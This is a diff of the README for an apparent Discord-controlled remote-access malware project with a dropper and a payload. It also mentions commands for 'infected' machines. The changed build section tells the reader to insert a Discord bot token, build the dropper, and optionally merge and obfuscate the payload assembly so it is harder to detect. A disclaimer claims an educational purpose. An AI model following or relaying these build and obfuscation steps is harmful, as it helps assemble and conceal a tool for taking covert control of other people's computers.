@@ -34,10 +34,10 @@ uninfect : Uninfect specified machine.
 ```
 
 ## How to build
-1. Compile the payload project.
-2. Place the payload application in the dropper folder (next to dropper.csproj).
-3. Open the dropper project and change the token variable to your Discord bot token. Prefix is also customisable.
-4. Build the dropper project.
+1. Specify the token and other variables in the dropper project Program.cs.
+2. Build the dropper project.
+
+Optional: Build the payload project and merge/embed all the dlls + obfuscate the output assembly. Replace payload.exe in the dropper project with your new payload.
 
 ## Disclaimer
 This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
